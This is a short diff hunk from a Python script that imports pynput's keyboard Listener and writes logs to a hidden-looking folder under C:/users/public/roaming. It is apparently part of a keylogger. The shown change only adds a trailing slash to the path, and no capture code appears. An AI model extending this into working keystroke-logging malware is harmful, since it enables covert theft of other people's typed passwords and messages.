@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 import sys
 import logging
 
-log_dir = r"C:/users/public/roaming"
+log_dir = r"C:/users/public/roaming/"
 
 try:
     logging.basicConfig (
